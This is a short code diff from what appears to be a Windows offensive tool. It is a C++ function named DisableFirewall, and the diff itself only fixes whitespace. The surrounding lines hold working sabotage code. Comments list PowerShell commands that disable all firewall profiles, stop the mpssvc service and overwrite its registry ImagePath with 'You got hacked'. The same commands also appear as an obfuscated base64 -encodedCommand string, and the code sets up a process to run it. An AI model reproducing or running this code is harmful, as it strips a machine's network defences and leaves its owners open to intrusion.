@@ -190,7 +190,7 @@ int DisableFirewall() {
 
 	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
 		Log("[!] DisableFirewall Stdout SetHandleInformation: " + std::to_string(GetLastError()), componentName);\
-			return 2;
+		return 2;
 	}
 
 	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
@@ -221,8 +221,6 @@ int DisableFirewall() {
 	// Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False;
 	// Stop-Service -Name 'mpssvc' -Force;
 	// Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\mpssvc' -Name 'ImagePath' -Value 'You got hacked' -Type ExpandString -Force -ErrorAction Continue;
-
-
 	std::string cmd = "powershell.exe -encodedCommand UwBlAHQALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUAByAG8AZgBpAGwAZQAgAC0AUAByAG8AZgBpAGwAZQAgAEQAbwBtAGEAaQBuACwAIABQAHUAYgBsAGkAYwAsACAAUAByAGkAdgBhAHQAZQAgAC0ARQBuAGEAYgBsAGUAZAAgAEYAYQBsAHMAZQA7ACAAUwB0AG8AcAAtAFMAZQByAHYAaQBjAGUAIAAtAE4AYQBtAGUAIAAnAG0AcABzAHMAdgBjACcAIAAtAEYAbwByAGMAZQA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABtAHAAcwBzAHYAYwAnACAALQBOAGEAbQBlACAAJwBJAG0AYQBnAGUAUABhAHQAaAAnACAALQBWAGEAbAB1AGUAIAAnAFkAbwB1ACAAZwBvAHQAIABoAGEAYwBrAGUAZAAnACAALQBUAHkAcABlACAARQB4AHAAYQBuAGQAUwB0AHIAaQBuAGcAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsA";
 
 	if (!CreateProcessA(
